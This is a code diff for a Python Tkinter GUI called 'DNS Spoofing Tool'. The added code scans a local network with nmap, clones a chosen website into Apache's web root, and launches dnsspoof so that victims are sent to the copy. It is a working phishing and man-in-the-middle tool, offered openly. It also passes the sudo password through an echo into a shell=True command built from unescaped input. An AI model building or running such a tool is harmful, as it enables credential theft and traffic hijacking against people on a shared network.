@@ -1,116 +1,113 @@
 import os
 import subprocess
+import shutil
 import tkinter as tk
 from tkinter import filedialog, messagebox, simpledialog, ttk
 import netifaces
 import nmap
+import requests
+from bs4 import BeautifulSoup
+import re
 import threading
 import getpass
+
+class Tooltip:
+    def __init__(self, widget, text):
+        self.widget = widget
+        self.text = text
+        self.widget.bind("<Enter>", self.enter)
+        self.widget.bind("<Leave>", self.leave)
+        self.tooltip = None
+
+    def enter(self, event=None):
+        self.tooltip = tk.Toplevel(self.widget)
+        x, y, _, _ = self.widget.bbox("insert")
+        x_root, y_root = self.widget.winfo_rootx() + x + 25, self.widget.winfo_rooty() + y + 20
+        self.tooltip.wm_overrideredirect(True)
+        self.tooltip.wm_geometry(f"+{x_root}+{y_root}")
+        label = tk.Label(self.tooltip, text=self.text, background="#ffffe0", relief="solid", borderwidth=1)
+        label.pack(ipadx=1)
+
+    def leave(self, event=None):
+        if self.tooltip:
+            self.tooltip.destroy()
+
+class NmapScanWindow:
+    def __init__(self, parent, ip_range):
+        self.parent = parent
+        self.ip_range = ip_range
+        self.root = tk.Toplevel(parent)
+        self.root.title("Nmap Scan Progress")
+
+        self.progress_label = tk.Label(self.root, text="Scanning in progress...")
+        self.progress_label.pack(padx=10, pady=5)
+
+        self.progress_bar = ttk.Progressbar(self.root, orient="horizontal", length=200, mode="determinate")
+        self.progress_bar.pack(padx=10, pady=5)
+
+        self.scan_result_text = tk.Text(self.root, height=15, width=50)
+        self.scan_result_text.pack(padx=10, pady=5)
+
+    def update_scan_progress(self, percent):
+        self.progress_bar["value"] = percent
+        self.root.update()
+
+    def update_scan_results(self, results):
+        self.scan_result_text.insert(tk.END, results)
+        self.scan_result_text.see(tk.END)
+
+    def close_window(self):
+        self.root.destroy()
 
 class DNS_Spoofing_Tool:
     def __init__(self, root):
         self.root = root
         self.root.title("DNS Spoofing Tool")
-
-        # Create tabs
-        self.tabs = ttk.Notebook(root)
-        self.tabs.pack(expand=1, fill="both")
-
-        # Add tabs
-        self.create_dns_tab()
-        self.create_nmap_tab()
-
-    def create_dns_tab(self):
-        self.dns_tab = ttk.Frame(self.tabs)
-        self.tabs.add(self.dns_tab, text="DNS Spoofing")
+        self.downloaded_folder = ""
 
         # Label and entry for Parrot Linux IP
-        self.parrot_ip_label = tk.Label(self.dns_tab, text="Your IP:")
+        self.parrot_ip_label = tk.Label(root, text="Your IP:")
         self.parrot_ip_label.grid(row=0, column=0, padx=10, pady=5)
-        self.parrot_ip_entry = tk.Entry(self.dns_tab)
+        self.parrot_ip_entry = tk.Entry(root)
         self.parrot_ip_entry.grid(row=0, column=1, padx=10, pady=5)
-        self.tooltip(self.parrot_ip_entry, "Your Parrot Linux IP address.")
+        Tooltip(self.parrot_ip_entry, "Your Parrot Linux IP address.")
 
         # Label and entry for target URL
-        self.target_url_label = tk.Label(self.dns_tab, text="Target URL:")
+        self.target_url_label = tk.Label(root, text="Target URL:")
         self.target_url_label.grid(row=1, column=0, padx=10, pady=5)
-        self.target_url_entry = tk.Entry(self.dns_tab)
+        self.target_url_entry = tk.Entry(root)
         self.target_url_entry.grid(row=1, column=1, padx=10, pady=5)
-        self.tooltip(self.target_url_entry, "Enter the URL of the website you want to clone.")
+        Tooltip(self.target_url_entry, "Enter the URL of the website you want to clone.")
 
         # Button to scan for available target IPs
-        self.scan_button = tk.Button(self.dns_tab, text="Scan for Target IPs", command=self.scan_ips)
+        self.scan_button = tk.Button(root, text="Scan for Target IPs", command=self.scan_ips)
         self.scan_button.grid(row=0, column=2, padx=10, pady=5)
-        self.tooltip(self.scan_button, "Scan for available target IP addresses in the network.")
+        Tooltip(self.scan_button, "Scan for available target IP addresses in the network.")
 
         # Dropdown for network interface
-        self.interface_label = tk.Label(self.dns_tab, text="Network Interface:")
+        self.interface_label = tk.Label(root, text="Network Interface:")
         self.interface_label.grid(row=2, column=0, padx=10, pady=5)
         self.interfaces = netifaces.interfaces()
-        self.interface_var = tk.StringVar(self.dns_tab)
+        self.interface_var = tk.StringVar(root)
         self.interface_var.set(self.interfaces[0])  # Set default value
-        self.interface_dropdown = tk.OptionMenu(self.dns_tab, self.interface_var, *self.interfaces)
+        self.interface_dropdown = tk.OptionMenu(root, self.interface_var, *self.interfaces)
         self.interface_dropdown.grid(row=2, column=1, padx=10, pady=5)
-        self.tooltip(self.interface_dropdown, "Select the network interface to use for DNS spoofing.")
+        Tooltip(self.interface_dropdown, "Select the network interface to use for DNS spoofing.")
 
         # Label to display available target IPs
-        self.target_ips_label = tk.Label(self.dns_tab, text="Available Target IPs:")
+        self.target_ips_label = tk.Label(root, text="Available Target IPs:")
         self.target_ips_label.grid(row=3, column=0, padx=10, pady=5)
-        self.target_ips_text = tk.Text(self.dns_tab, height=5, width=50)
+        self.target_ips_text = tk.Text(root, height=5, width=50)
         self.target_ips_text.grid(row=3, column=1, columnspan=2, padx=10, pady=5)
-        self.tooltip(self.target_ips_text, "List of available target IP addresses found in the network.")
+        Tooltip(self.target_ips_text, "List of available target IP addresses found in the network.")
 
         # Button to start DNS spoofing
-        self.start_button = tk.Button(self.dns_tab, text="Start DNS Spoofing", command=self.start_dns_spoofing)
+        self.start_button = tk.Button(root, text="Start DNS Spoofing", command=self.start_dns_spoofing)
         self.start_button.grid(row=5, column=0, columnspan=2, padx=10, pady=5)
-        self.tooltip(self.start_button, "Start DNS spoofing with the specified configuration.")
+        Tooltip(self.start_button, "Start DNS spoofing with the specified configuration.")
 
         # Get and display Parrot Linux IP
         self.parrot_ip_entry.insert(0, self.get_parrot_ip())
-
-    def create_nmap_tab(self):
-        self.nmap_tab = ttk.Frame(self.tabs)
-        self.tabs.add(self.nmap_tab, text="Nmap Commands")
-
-        # Nmap commands and descriptions
-        nmap_commands = {
-            "nmap 192.168.1.1": "Scan a single IP",
-            "nmap 192.168.1.1 192.168.2.1": "Scan specific IPs",
-            # Add more commands and descriptions here
-        }
-
-        # Display Nmap commands and descriptions
-        for i, (command, description) in enumerate(nmap_commands.items(), start=1):
-            label = tk.Label(self.nmap_tab, text=f"{i}. {command}: {description}")
-            label.grid(row=i, column=0, padx=10, pady=5, sticky="w")
-
-        # Input field to execute Nmap command by number
-        self.nmap_input_label = tk.Label(self.nmap_tab, text="Enter command number:")
-        self.nmap_input_label.grid(row=len(nmap_commands)+1, column=0, padx=10, pady=5, sticky="w")
-        self.nmap_input_entry = tk.Entry(self.nmap_tab)
-        self.nmap_input_entry.grid(row=len(nmap_commands)+1, column=1, padx=10, pady=5)
-        self.tooltip(self.nmap_input_entry, "Enter the number of the command you want to execute.")
-
-        # Button to execute selected Nmap command
-        self.execute_button = tk.Button(self.nmap_tab, text="Execute", command=self.execute_nmap_command)
-        self.execute_button.grid(row=len(nmap_commands)+1, column=2, padx=10, pady=5)
-
-    def tooltip(self, widget, text):
-        widget.bind("<Enter>", lambda event, text=text: self.show_tooltip(event, text))
-        widget.bind("<Leave>", self.hide_tooltip)
-
-    def show_tooltip(self, event, text):
-        tooltip = tk.Toplevel(event.widget)
-        x, y, _, _ = event.widget.bbox("insert")
-        x_root, y_root = event.widget.winfo_rootx() + x + 25, event.widget.winfo_rooty() + y + 20
-        tooltip.wm_overrideredirect(True)
-        tooltip.wm_geometry(f"+{x_root}+{y_root}")
-        label = tk.Label(tooltip, text=text, background="#ffffe0", relief="solid", borderwidth=1)
-        label.pack(ipadx=1)
-
-    def hide_tooltip(self, event):
-        event.widget.tk_focusNext().focus()
-        event.widget.focus_set()
 
     def get_parrot_ip(self):
         # Get IP address of the Parrot Linux machine
@@ -119,13 +116,112 @@ class DNS_Spoofing_Tool:
                 return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
 
     def scan_ips(self):
-        pass
+        try:
+            # Retrieve IP range from user input
+            ip_range_input = simpledialog.askstring("IP Range", "Enter IP range (e.g., 192.168.0.0/24):")
+            if ip_range_input:
+                self.scan_window = NmapScanWindow(self.root, ip_range_input)
+                # Perform a network scan to identify other devices on the network
+                nm = nmap.PortScanner()
+
+                # Callback function to update UI with scan results
+                def callback_result(host, scan_result):
+                    manufacturer = scan_result['vendor'].get('mac') if 'vendor' in scan_result else "Unknown"
+                    result = f"IP: {host}, Manufacturer: {manufacturer}\n"
+                    self.scan_window.update_scan_results(result)
+
+                # Callback function to update UI with scan progress
+                def callback_progress(current, total):
+                    percent = int((current / total) * 100)
+                    self.scan_window.update_scan_progress(percent)
+
+                # Scan hosts in the given IP range
+                nm.scan(hosts=ip_range_input, arguments='-sn', callback=callback_result, callback_progress=callback_progress)
+
+        except Exception as e:
+            messagebox.showerror("Error", f"An error occurred while scanning IPs: {str(e)}")
+
+    def download_website(self, url, folder_path):
+        # Download website contents and save locally
+        response = requests.get(url)
+        soup = BeautifulSoup(response.content, 'html.parser')
+
+        # Create folder if not exists
+        if not os.path.exists(folder_path):
+            os.makedirs(folder_path)
+
+        # Save HTML file
+        html_file_path = os.path.join(folder_path, 'index.html')
+        with open(html_file_path, 'w') as file:
+            file.write(soup.prettify())
+
+        # Download and save CSS files
+        css_file_paths = []
+        for link in soup.find_all('link', href=True):
+            css_url = link['href']
+            if css_url.startswith(('http://', 'https://')):
+                css_response = requests.get(css_url)
+                css_file_name = re.sub(r'\W+', '', os.path.basename(css_url))  # Remove non-alphanumeric characters
+                css_file_path = os.path.join(folder_path, css_file_name)
+                with open(css_file_path, 'wb') as css_file:
+                    css_file.write(css_response.content)
+                css_file_paths.append(css_file_path)
+
+        # Download and save JavaScript files
+        js_file_paths = []
+        for script in soup.find_all('script', src=True):
+            js_url = script['src']
+            if js_url.startswith(('http://', 'https://')):
+                js_response = requests.get(js_url)
+                js_file_name = re.sub(r'\W+', '', os.path.basename(js_url))  # Remove non-alphanumeric characters
+                js_file_path = os.path.join(folder_path, js_file_name)
+                with open(js_file_path, 'wb') as js_file:
+                    js_file.write(js_response.content)
+                js_file_paths.append(js_file_path)
+
+        return html_file_path, css_file_paths, js_file_paths
+
+    def select_folder(self):
+        # Opens file dialog to select folder for downloaded website files
+        self.downloaded_folder = filedialog.askdirectory()
 
     def start_dns_spoofing(self):
-        pass
+        try:
+            # Get Parrot Linux IP, target URL, and selected network interface
+            parrot_ip = self.parrot_ip_entry.get()
+            target_url = self.target_url_entry.get()
+            selected_interface = self.interface_var.get()
 
-    def execute_nmap_command(self):
-        pass
+            # Download website contents
+            if self.downloaded_folder:
+                html_file_path, css_file_paths, js_file_paths = self.download_website(target_url, self.downloaded_folder)
+
+                # Update hosts.txt with Parrot Linux IP and target URL
+                hosts_file_path = "/tmp/hosts.txt"
+                with open(hosts_file_path, "w") as f:
+                    f.write(f"{parrot_ip} {target_url}")
+
+                # Move downloaded website files to Apache's root directory
+                shutil.move(html_file_path, "/var/www/html/")
+                for css_file_path in css_file_paths:
+                    shutil.move(css_file_path, "/var/www/html/")
+                for js_file_path in js_file_paths:
+                    shutil.move(js_file_path, "/var/www/html/")
+
+                # Get sudo password
+                sudo_password = simpledialog.askstring("Password", "Enter your sudo password:", show="*")
+                if sudo_password:
+                    # Start DNS spoofing with selected network interface
+                    command = f"echo {sudo_password} | sudo -S dnsspoof -i {selected_interface} -f {hosts_file_path}"
+                    subprocess.Popen(command, shell=True)
+                    messagebox.showinfo("Success", "DNS Spoofing started successfully!")
+                else:
+                    messagebox.showerror("Error", "Password not provided.")
+
+            else:
+                messagebox.showerror("Error", "Please select a folder for downloaded website files.")
+        except Exception as e:
+            messagebox.showerror("Error", f"An error occurred: {str(e)}")
 
 if __name__ == "__main__":
     root = tk.Tk()
